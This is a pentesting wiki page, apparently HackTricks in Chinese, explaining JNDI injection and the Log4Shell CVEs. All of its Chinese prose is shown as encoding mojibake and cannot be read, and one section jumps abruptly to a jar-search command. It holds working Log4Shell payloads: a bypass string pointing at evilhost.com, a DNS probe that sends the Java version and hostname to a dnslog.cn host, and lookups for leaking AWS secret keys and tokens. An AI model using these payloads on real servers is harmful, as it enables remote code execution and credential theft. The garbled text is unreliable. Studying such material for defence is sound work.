# JNDI - Javaå‘½åå’Œç›®å½•æ¥å£ & Log4Shell

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´è‡³æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°å¯¹æ‚¨æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«ä¿®å¤å®ƒä»¬ã€‚Intruderè¿½è¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œåœ¨æ‚¨çš„æ•´ä¸ªæŠ€æœ¯æ ˆä¸­æ‰¾åˆ°é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ä»Šå¤©å°±å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## åŸºæœ¬ä¿¡æ¯

JNDIè‡ª20ä¸–çºª90å¹´ä»£æœ«å°±å­˜åœ¨äºJavaä¸­ã€‚å®ƒæ˜¯ä¸€ç§ç›®å½•æœåŠ¡ï¼Œ**å…è®¸Javaç¨‹åºé€šè¿‡åç§°æœåŠ¡åœ¨ç›®å½•ä¸­æŸ¥æ‰¾æ•°æ®**ã€‚åç§°æœåŠ¡å…³è”å€¼ï¼ˆç»‘å®šï¼‰ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ç›®å½•ä¸­çš„å¼•ç”¨è·å–å®ƒã€‚

JNDIæœ‰è®¸å¤š**æœåŠ¡æä¾›å•†æ¥å£**ï¼ˆSPIï¼‰ï¼Œä½¿å…¶èƒ½å¤Ÿä½¿ç”¨å„ç§ç›®å½•æœåŠ¡ã€‚JNDIçš„ç›®æ ‡æ˜¯éå¸¸å®¹æ˜“åœ°ä»å…¶ä»–ç³»ç»Ÿè·å–æ•°æ®ã€‚æ‚¨ç”šè‡³å¯ä»¥è¿œç¨‹è·å–Javaå¯¹è±¡ï¼Œè¿™å°±æ˜¯é—®é¢˜æ‰€åœ¨ã€‚

ä¾‹å¦‚ï¼Œå­˜åœ¨**CORBA COS**ï¼ˆå…¬å…±å¯¹è±¡æœåŠ¡ï¼‰ã€**Java RMI**ï¼ˆè¿œç¨‹æ–¹æ³•æ¥å£ï¼‰æ³¨å†Œè¡¨å’Œ**LDAP**çš„SPIã€‚

![](<../../.gitbook/assets/image (627).png>)

### JNDIå‘½åå¼•ç”¨

ä¸ºäº†æ£€ç´¢Javaå¯¹è±¡ï¼Œæ‚¨å¯ä»¥åºåˆ—åŒ–å®ƒä»¬å¹¶ä¿å­˜äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ã€‚ä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™ä¸èµ·ä½œç”¨ï¼ˆå¯èƒ½æ˜¯å› ä¸ºæ•°æ®å¤ªå¤§æˆ–å…¶ä»–ä»»ä½•äº‹æƒ…ï¼‰ã€‚\
ä¸ºäº†æ›´å®¹æ˜“åœ°ä¿å­˜Javaå¯¹è±¡ï¼Œ**ä½¿ç”¨å‘½åå¼•ç”¨**ã€‚\
æœ‰ä¸¤ç§ç±»å‹çš„å‘½åå¼•ç”¨ï¼š

* **å¼•ç”¨åœ°å€**ï¼šè¿™æŒ‡ç¤ºå¯¹è±¡çš„åœ°å€ï¼ˆ_rmi://server/ref_ï¼‰ï¼Œç„¶å**å°†ä»è¯¥åœ°å€æ£€ç´¢å¯¹è±¡**ã€‚
* **è¿œç¨‹å·¥å‚**ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†åœ¨JNDIå¼•ç”¨ä¸­æŒ‡å‡ºä¸€ä¸ª**è¿œç¨‹å·¥å‚ç±»**ï¼Œç„¶åï¼ŒæŒ‰ç…§JNDIåœ°å€ï¼Œè¿œç¨‹ç±»å°†ä»è¿œç¨‹å·¥å‚è·å–ï¼Œå¹¶ä¸”**ç±»å°†è¢«ä¸‹è½½å’ŒåŠ è½½**ã€‚

è¿™æ˜¯å±é™©çš„ï¼Œå› ä¸º**æ”»å‡»è€…å¯èƒ½ä½¿ç³»ç»ŸåŠ è½½ä»»æ„å¯¹è±¡å¹¶æ‰§è¡Œä»»æ„ä»£ç **ï¼Œå› æ­¤å­˜åœ¨ä¸€äº›ä¿æŠ¤æªæ–½ï¼š

* **RMI**ï¼š`java.rmi.server.useCodeabseOnly = true` é»˜è®¤è‡ª**JDK 7u21**èµ·å¯ç”¨ï¼Œå¦åˆ™å®ƒå°†å…è®¸è¿œç¨‹åŠ è½½è‡ªå®šä¹‰Javaå¯¹è±¡ã€‚æ­¤å¤–ï¼Œå³ä½¿ä¿æŠ¤è¢«ç¦ç”¨ï¼Œä¹Ÿä¼šå¼ºåˆ¶æ‰§è¡Œ**å®‰å…¨ç®¡ç†å™¨**æ¥é…ç½®å¯ä»¥åŠ è½½ä»€ä¹ˆã€‚
* **LDAP**ï¼š`com.sun.jndi.ldap.object.trustURLCodebase = false` é»˜è®¤è‡ª**JDK** **6u141, 7u131, 8u121**èµ·å¯ç”¨ï¼Œå®ƒä¸å…è®¸æ‰§è¡Œä¸‹è½½çš„ä»»æ„Javaå¯¹è±¡ã€‚ä½†å¦‚æœè®¾ç½®ä¸º`true`ï¼Œå®ƒå°†å…è®¸ï¼Œå¹¶ä¸”**ä¸ä¼šå¼ºåˆ¶æ‰§è¡Œå®‰å…¨ç®¡ç†å™¨**ã€‚
* **CORBA**ï¼šæ²¡æœ‰è¦é…ç½®çš„å±æ€§ï¼Œä½†**å®‰å…¨ç®¡ç†å™¨å§‹ç»ˆè¢«å¼ºåˆ¶æ‰§è¡Œ**ã€‚

æ­¤å¤–ï¼Œ**å‘½åç®¡ç†å™¨**ï¼Œå³å°†éµå¾ªJNDIé“¾æ¥çš„ç®¡ç†å™¨ï¼Œæ²¡æœ‰ä»»ä½•å®‰å…¨ç®¡ç†å™¨æˆ–è¦é…ç½®çš„å±æ€§ï¼Œæ‰€ä»¥å®ƒå°†å§‹ç»ˆå°è¯•è·å–å¯¹è±¡ã€‚

æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œ**æ€»ä½“ä¸Šçš„ä¿æŠ¤æªæ–½ä¸è¶³**ï¼Œå› ä¸º**æ²¡æœ‰é˜²æ­¢ä»éšæœºåœ°å€åŠ è½½JNDIçš„ä¿æŠ¤**ï¼Œå¹¶ä¸”RMIã€LDAPå’ŒCORBAçš„ä¿æŠ¤å¯èƒ½è¢«ç»•è¿‡ï¼ˆå–å†³äºé…ç½®ï¼‰ï¼Œä»¥**åŠ è½½ä»»æ„Javaå¯¹è±¡**æˆ–**åŠ è½½Javaå¯¹è±¡**ï¼Œè¿™äº›å¯¹è±¡å°†æ»¥ç”¨åº”ç”¨ç¨‹åºä¸­ç°æœ‰çš„ç»„ä»¶ä½œä¸º**å°å·¥å…·æ¥æ‰§è¡Œä»»æ„ä»£ç **ã€‚

URLç¤ºä¾‹ä»¥æ»¥ç”¨JNDIï¼š

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### JNDIç¤ºä¾‹

![](<../../.gitbook/assets/image (655) (1) (1).png>)

å³ä½¿æ‚¨å·²è®¾ç½®**`PROVIDER_URL`**ï¼Œæ‚¨ä¹Ÿå¯ä»¥åœ¨æŸ¥æ‰¾ä¸­æŒ‡å®šä¸åŒçš„URLï¼Œå®ƒå°†è¢«è®¿é—®ï¼š`ctx.lookup("<attacker-controlled-url>")`ï¼Œè¿™å°±æ˜¯æ”»å‡»è€…å°†æ»¥ç”¨çš„å†…å®¹ï¼Œä»¥ä¾¿ä»ä»–æ§åˆ¶çš„ç³»ç»Ÿä¸­åŠ è½½ä»»æ„å¯¹è±¡ã€‚

### CORBA

**äº’æ“ä½œå¯¹è±¡å¼•ç”¨ï¼ˆIORï¼‰**æ˜¯CORBAæˆ–RMI-IIOPå¼•ç”¨ï¼Œå®ƒå”¯ä¸€åœ°æ ‡è¯†è¿œç¨‹CORBAæœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚IORå¯ä»¥æ˜¯äºŒè¿›åˆ¶æ ¼å¼æˆ–äºŒè¿›åˆ¶çš„å­—ç¬¦ä¸²åå…­è¿›åˆ¶è¡¨ç¤ºã€‚\
é™¤å…¶ä»–ä¿¡æ¯å¤–ï¼Œå®ƒåŒ…å«**ç±»å‹ID**ï¼ˆæ¥å£çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼‰å’Œ**ä»£ç åº“**ï¼ˆç”¨äºè·å–å­˜æ ¹ç±»çš„è¿œç¨‹ä½ç½®ï¼‰ã€‚\
è¯·æ³¨æ„ï¼Œ**é»˜è®¤æƒ…å†µä¸‹CORBAä¸èƒ½è¢«æ»¥ç”¨**ã€‚\
å®ƒéœ€è¦ï¼š

* å¿…é¡»å®‰è£…**å®‰å…¨ç®¡ç†å™¨**
* å®‰å…¨ç®¡ç†å™¨å¿…é¡»å…è®¸è¿æ¥åˆ°**æ”»å‡»è€…æ§åˆ¶çš„ä»£ç åº“**ã€‚å…è®¸æ­¤æ“ä½œçš„æ–¹æ³•æœ‰å‡ ç§ï¼š
  * å¥—æ¥å­—æƒé™ï¼š`permissions java.net.SocketPermission "*:1098-1099", "connect";`
  * å…è®¸è¯»å–æ‰€æœ‰æ–‡ä»¶çš„æ–‡ä»¶æƒé™ï¼š`permission java.io.FilePermission "<<ALL FILES>>", "read";`
  * å…è®¸è¯»å–æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ¼æ´åˆ©ç”¨å·¥å…·ï¼ˆç±»æˆ–zipå­˜æ¡£ï¼‰çš„æ–‡ä»¶å¤¹çš„æ–‡ä»¶æƒé™

æ‚¨å¯èƒ½ä¼šå‘ç°**ä¾›åº”å•†çš„ç­–ç•¥é»˜è®¤å…è®¸è¿™æ ·åš**ã€‚

### RMI

å¦‚å‰é¢**JNDIå‘½åå¼•ç”¨éƒ¨åˆ†**æ‰€è¿°ï¼ŒRMIé»˜è®¤ä¸å…è®¸ä¸‹è½½ä»»æ„Javaç±»ã€‚è€Œä¸”ï¼Œå³ä½¿å®ƒä¼šï¼Œæ‚¨è¿˜éœ€è¦**ç»•è¿‡å®‰å…¨ç®¡ç†å™¨ç­–ç•¥**ï¼ˆåœ¨å‰ä¸€èŠ‚ä¸­æˆ‘ä»¬äº†è§£åˆ°è¿™æ˜¯å¯èƒ½çš„ï¼Œä½¿ç”¨CORBAï¼‰ã€‚

### LDAP

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åŒºåˆ†æœç´¢å’ŒæŸ¥æ‰¾ã€‚\
**æœç´¢**å°†ä½¿ç”¨åƒ`ldap://localhost:389/o=JNDITutorial`è¿™æ ·çš„URLä»LDAPæœåŠ¡å™¨æŸ¥æ‰¾JNDITutorialå¯¹è±¡ï¼Œå¹¶**æ£€ç´¢å…¶å±æ€§**ã€‚\
**æŸ¥æ‰¾**æ˜¯ä¸ºäº†**å‘½åæœåŠ¡**ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦è·å–**ç»‘å®šåˆ°åç§°çš„ä»»ä½•å†…å®¹**ã€‚

å¦‚æœLDAPæœç´¢æ˜¯ç”¨**SearchControls.setReturningObjFlag()** å’Œ`true`è°ƒç”¨çš„ï¼Œé‚£ä¹ˆè¿”å›çš„å¯¹è±¡å°†è¢«é‡å»ºã€‚

å› æ­¤ï¼Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥æ”»å‡»è¿™äº›é€‰é¡¹ã€‚\
**æ”»å‡»è€…å¯èƒ½ä¼šåœ¨LDAPè®°å½•ä¸­å¼•å…¥æœ‰æ•ˆè½½è·**ï¼Œè¿™äº›æœ‰æ•ˆè½½è·å°†åœ¨æ”¶é›†å®ƒä»¬çš„ç³»ç»Ÿä¸­æ‰§è¡Œï¼ˆå¦‚æœæ‚¨å¯ä»¥è®¿é—®LDAPæœåŠ¡å™¨ï¼Œè¿™éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥**å±å®³æ•°åå°æœºå™¨**ï¼‰ã€‚å¦ä¸€ç§åˆ©ç”¨è¿™ä¸ªçš„æ–¹æ³•æ˜¯å¯¹LDAPæœç´¢è¿›è¡Œ**MitMæ”»å‡»**ã€‚

å¦‚æœæ‚¨å¯ä»¥**ä½¿åº”ç”¨ç¨‹åºè§£æJNDI LDAP URL**ï¼Œæ‚¨å¯ä»¥æ§åˆ¶å°†è¢«æœç´¢çš„LDAPï¼Œå¹¶ä¸”æ‚¨å¯ä»¥å‘é€å›æ¼æ´åˆ©ç”¨å·¥å…·ï¼ˆlog4shellï¼‰ã€‚

#### ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**æ¼æ´åˆ©ç”¨å·¥å…·è¢«åºåˆ—åŒ–**ï¼Œå¹¶å°†è¢«ååºåˆ—åŒ–ã€‚\
å¦‚æœ`trustURLCodebase`æ˜¯`true`ï¼Œæ”»å‡»è€…å¯ä»¥æä¾›ä»–è‡ªå·±çš„ç±»åœ¨ä»£ç åº“ä¸­ï¼Œå¦‚æœä¸æ˜¯ï¼Œä»–å°†éœ€è¦æ»¥ç”¨ç±»è·¯å¾„ä¸­çš„å°å·¥å…·ã€‚

#### JNDIå¼•ç”¨æ¼æ´åˆ©ç”¨

ä½¿ç”¨**JavaFactoryå¼•ç”¨**æ”»å‡»è¿™ä¸ªLDAPæ›´å®¹æ˜“ï¼š

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shellæ¼æ´

æ¼æ´æ˜¯åœ¨Log4jä¸­å¼•å…¥çš„ï¼Œå› ä¸ºå®ƒæ”¯æŒä¸€ç§[${prefix:name}](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)çš„[**ç‰¹æ®Šè¯­æ³•**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)ï¼Œå…¶ä¸­`prefix`æ˜¯å¤šç§ä¸åŒ[**æŸ¥æ‰¾**](https://logging.apache.org/log4j/2.x/manual/lookups.html)ä¹‹ä¸€ï¼Œ`name`åº”è¯¥è¢«è¯„ä¼°ã€‚ä¾‹å¦‚ï¼Œ`${java:version}`æ˜¯å½“å‰è¿è¡Œçš„Javaç‰ˆæœ¬ã€‚

åœ¨[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)ä¸­æ·»åŠ äº†ä¸€ä¸ª`jndi`æŸ¥æ‰¾ï¼Œå¦‚ä¸‹æ‰€è¿°ï¼šâ€œJndiLookupå…è®¸é€šè¿‡JNDIæ£€ç´¢å˜é‡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé”®å°†ä»¥java:comp/env/ä¸ºå‰ç¼€ï¼Œä½†å¦‚æœé”®åŒ…å«**":"ï¼Œåˆ™ä¸ä¼šæ·»åŠ å‰ç¼€**ã€‚â€

å¦‚æœé”®ä¸­å­˜åœ¨**:**ï¼Œå¦‚`${jndi:ldap://example.com/a}`ä¸­çš„ï¼Œå°±**æ²¡æœ‰å‰ç¼€**ï¼Œå¹¶ä¸”**LDAPæœåŠ¡å™¨è¢«æŸ¥è¯¢å¯¹è±¡**ã€‚è¿™äº›æŸ¥æ‰¾å¯ä»¥ç”¨äºLog4jçš„é…ç½®ä»¥åŠè®°å½•æ—¥å¿—æ—¶ã€‚

å› æ­¤ï¼Œå”¯ä¸€éœ€è¦çš„æ˜¯è®©**æ˜“å—æ”»å‡»çš„Log4jç‰ˆæœ¬å¤„ç†ç”¨æˆ·æ§åˆ¶çš„ä¿¡æ¯**ã€‚ç”±äºè¿™æ˜¯Javaåº”ç”¨ç¨‹åºå¹¿æ³›ä½¿ç”¨çš„åº“ï¼Œç”¨äºè®°å½•ä¿¡æ¯ï¼ˆåŒ…æ‹¬é¢å‘Internetçš„åº”ç”¨ç¨‹åºï¼‰ï¼Œå› æ­¤å¾ˆå¸¸è§çš„æ˜¯ï¼Œä¾‹å¦‚ï¼ŒLog4jè®°å½•æ¥æ”¶åˆ°çš„HTTPå¤´éƒ¨ä¿¡æ¯ï¼Œå¦‚User-Agentã€‚ç„¶è€Œï¼Œlog4j**ä¸ä»…ç”¨äºè®°å½•HTTPä¿¡æ¯ï¼Œè¿˜ç”¨äºè®°å½•å¼€å‘äººå‘˜æŒ‡å®šçš„ä»»ä½•è¾“å…¥**å’Œæ•°æ®ã€‚

## Log4Shell CVEs

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[ä¸¥é‡]**ï¼šåŸå§‹çš„'Log4Shell'æ¼æ´æ˜¯ä¸€ä¸ª[ä¸å—ä¿¡ä»»çš„ååºåˆ—åŒ–](https://cwe.mitre.org/data/definitions/502.html)ç¼ºé™·ã€‚åœ¨[CVSS](https://www.first.org/cvss/)é‡è¡¨ä¸Šè¯„ä¸ºä¸¥é‡ï¼Œè¿™ä¸ªæ¼æ´å¾—åˆ†ä¸º10ï¼Œ**æˆäºˆæœªç»è®¤è¯çš„æ”»å‡»è€…è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰èƒ½åŠ›**ï¼Œå…è®¸å®Œå…¨æ¥ç®¡ç³»ç»Ÿã€‚\
\
ç”±é˜¿é‡Œå·´å·´äº‘å®‰å…¨å›¢é˜Ÿçš„Chen Zhaojunäº11æœˆ24æ—¥å‘ApacheæŠ¥å‘Šï¼ŒCVE-2021-44228å½±å“äº†å¤šä¸ªApacheæ¡†æ¶çš„é»˜è®¤é…ç½®ï¼ŒåŒ…æ‹¬Apache Struts2ã€Apache Solrã€Apache Druidã€Apache Flinkç­‰ã€‚\
\
ä½œä¸ºæœ€å±é™©çš„æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´æ½œä¼åœ¨[log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core)ç»„ä»¶ä¸­ï¼Œä»…é™äº2.xç‰ˆæœ¬ï¼šä»2.0-beta9åˆ°åŒ…æ‹¬2.14.1ã€‚Log4Shellçš„ä¿®å¤ç‰ˆæœ¬åœ¨2.15.0ä¸­æ¨å‡ºï¼Œä½†è¢«è®¤ä¸ºä¸å®Œæ•´ï¼ˆç»§ç»­é˜…è¯»ï¼‰ã€‚\
\
å¨èƒæƒ…æŠ¥åˆ†æå¸ˆFlorian Rothåˆ†äº«äº†Sigmaè§„åˆ™ \[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)]ï¼Œå¯ä»¥ä½œä¸ºé˜²å¾¡ä¹‹ä¸€ã€‚\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**ä¸¥é‡**ï¼Œä¹‹å‰ä¸ºä½çº§åˆ«]: è¿™æ˜¯ä¸€ä¸ªæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ¼æ´ï¼Œå¾—åˆ†ä¸º~~3.7~~ 9.0ã€‚è¿™ä¸ªæ¼æ´æ˜¯ç”±äºCVE-2021-44228çš„**ä¸å®Œæ•´ä¿®å¤**å¯¼è‡´çš„ï¼Œè¯¥ä¿®å¤åœ¨2.15.0ä¸­å®æ–½ã€‚è™½ç„¶2.15.0çš„ä¿®å¤åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šè§£å†³äº†æ¼æ´ï¼Œä½†å¯¹äºæŸäº›**éé»˜è®¤é…ç½®**æ¥è¯´å¹¶éå¦‚æ­¤ã€‚\
\
Log4j 2.15.0å°è¯•**é»˜è®¤é™åˆ¶JNDI LDAPæŸ¥æ‰¾åˆ°\_localhost**\_ã€‚ä½†æ˜¯ï¼Œ**æ”»å‡»è€…**å¦‚æœæ§åˆ¶**çº¿ç¨‹ä¸Šä¸‹æ–‡æ˜ å°„ï¼ˆMDCï¼‰**è¾“å…¥æ•°æ®ï¼Œå¯ä»¥é€šè¿‡JNDIæŸ¥æ‰¾æ¨¡å¼åˆ¶ä½œæ¶æ„æœ‰æ•ˆè½½è·æ¥å¼•å‘DoSæ”»å‡»ã€‚è¿™é€‚ç”¨äºéé»˜è®¤é…ç½®ï¼Œå…¶ä¸­éé»˜è®¤æ¨¡å¼å¸ƒå±€ä½¿ç”¨ä¸Šä¸‹æ–‡æŸ¥æ‰¾ï¼Œä¾‹å¦‚\$${ctx:loginId}ï¼Œæˆ–çº¿ç¨‹ä¸Šä¸‹æ–‡æ˜ å°„æ¨¡å¼ï¼ˆ%Xã€%mdcæˆ–%MDCï¼‰ã€‚\
\
ä»è¿™ä¸ª[**æ¨æ–‡**](https://twitter.com/marcioalm/status/1471740771581652995)ä¸­è·å¾—çš„**ç»•è¿‡æ–¹æ³•**æ˜¯ï¼š\
_è¿™æ˜¯ä¸€ä¸ªåœ¨Log4J 2.15.0ä¸­ç»•è¿‡allowedLdapHostå’ŒallowedClassesæ£€æŸ¥ä»¥å®ç°RCEçš„PoCï¼š**`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`**ï¼Œè¦ç»•è¿‡allowedClassesï¼Œåªéœ€ä¸ºJDKä¸­çš„ä¸€ä¸ªç±»é€‰æ‹©ä¸€ä¸ªåç§°ã€‚ååºåˆ—åŒ–å°†åƒå¾€å¸¸ä¸€æ ·å‘ç”Ÿã€‚_\
\_\_\
\_\_"Log4j 2.16.0é€šè¿‡ç§»é™¤å¯¹æ¶ˆæ¯æŸ¥æ‰¾æ¨¡å¼çš„æ”¯æŒå¹¶é»˜è®¤ç¦ç”¨JNDIåŠŸèƒ½æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ"NVDå’¨è¯¢å£°æ˜ã€‚å¯¹äº2.12.1åˆ†æ”¯ä¸Šçš„äººæ¥è¯´ï¼Œä¿®å¤è¢«å›æº¯åˆ°2.12.2ã€‚\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[é«˜]**ï¼šæˆ‘ä»¬è¯´Log4j 2.xç‰ˆæœ¬å®¹æ˜“å—åˆ°æ”»å‡»äº†å—ï¼Ÿé‚£ä¹ˆ**Log4j 1.x**å‘¢ï¼Ÿ\
\
è™½ç„¶ä¹‹å‰è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œä½†Log4Shellè¿˜æ˜¯æ‰¾åˆ°äº†æ½œä¼åœ¨æ—§ç‰ˆLog4jä¸­çš„æ–¹æ³•ã€‚æœ¬è´¨ä¸Šï¼Œ**Log4j 1.xå®ä¾‹çš„éé»˜è®¤é…ç½®ä½¿ç”¨\_JMSAppender**\_\*\*ç±»ä¹Ÿå®¹æ˜“å—åˆ°ä¸å—ä¿¡ä»»çš„ååºåˆ—åŒ–ç¼ºé™·çš„å½±å“\*\*ã€‚\
\
å°½ç®¡æ˜¯CVE-2021-44228çš„è¾ƒè½»å¾®å˜ä½“ï¼Œä½†è¿™ä¸ªCVEå½±å“äº†æ‰€æœ‰ç‰ˆæœ¬çš„[log4j:log4j](https://search.maven.org/artifact/log4j/log4j)å’Œ[org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j)ç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶åªå­˜åœ¨1.xç‰ˆæœ¬ã€‚ç”±äºè¿™äº›æ˜¯[ç»ˆæ­¢ç”Ÿå‘½å‘¨æœŸ](https://logging.apache.org/log4j/1.2/)ç‰ˆæœ¬ï¼Œ**1.xåˆ†æ”¯çš„ä¿®å¤åœ¨ä»»ä½•åœ°æ–¹éƒ½ä¸å­˜åœ¨**ï¼Œåº”è¯¥å‡çº§åˆ°_log4j-core_ 2.
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **éªŒè¯**

ä¸€äº›ä¹‹å‰åˆ—å‡ºçš„å¹³å°å°†å…è®¸æ‚¨æ’å…¥ä¸€äº›å˜é‡æ•°æ®ï¼Œå½“è¯·æ±‚æ—¶ä¼šè¢«è®°å½•ã€‚\
è¿™å¯¹äºä¸¤ä»¶äº‹éå¸¸æœ‰ç”¨ï¼š

* éªŒè¯æ¼æ´
* åˆ©ç”¨æ¼æ´æ³„éœ²ä¿¡æ¯

ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥è¯·æ±‚ç±»ä¼¼ï¼š\
æˆ–è€… `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** å¦‚æœæ¥æ”¶åˆ°å¸¦æœ‰ç¯å¢ƒå˜é‡å€¼çš„ **DNSè¯·æ±‚**ï¼Œæ‚¨å°±çŸ¥é“åº”ç”¨ç¨‹åºæ˜¯æ˜“å—æ”»å‡»çš„ã€‚

å…¶ä»–æ‚¨å¯èƒ½å°è¯•æ³„éœ²çš„ä¿¡æ¯ï¼š
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE ä¿¡æ¯

{% hint style="info" %}
è¿è¡Œåœ¨ **JDK ç‰ˆæœ¬é«˜äº 6u141ã€7u131ã€8u121** çš„ä¸»æœºå°†å—åˆ° LDAP ç±»åŠ è½½å‘é‡çš„ä¿æŠ¤**ä½†ä¸åŒ…æ‹¬ååºåˆ—åŒ–å‘é‡**ã€‚è¿™æ˜¯å› ä¸º `com.sun.jndi.ldap.object.trustURLCodebase` é»˜è®¤æ˜¯ç¦ç”¨çš„ï¼Œå› æ­¤ JNDI ä¸èƒ½ä½¿ç”¨ LDAP åŠ è½½è¿œç¨‹ä»£ç åº“ã€‚ä½†æˆ‘ä»¬å¿…é¡»å¼ºè°ƒååºåˆ—åŒ–å’Œå˜é‡æ³„éœ²ä»ç„¶å¯èƒ½å‘ç”Ÿã€‚\
è¿™æ„å‘³ç€è¦**åˆ©ç”¨ä¸Šè¿°ç‰ˆæœ¬**ï¼Œä½ éœ€è¦**æ»¥ç”¨ Java åº”ç”¨ç¨‹åºä¸­å­˜åœ¨çš„æŸäº›å—ä¿¡ä»»å°å·¥å…·**ï¼ˆä¾‹å¦‚ä½¿ç”¨ ysoserial æˆ– JNDIExploitï¼‰ã€‚ä½†è¦åˆ©ç”¨æ›´ä½ç‰ˆæœ¬ï¼Œä½ å¯ä»¥è®©å®ƒä»¬åŠ è½½å¹¶æ‰§è¡Œä»»æ„ç±»ï¼ˆè¿™ä½¿å¾—æ”»å‡»æ›´å®¹æ˜“ï¼‰ã€‚

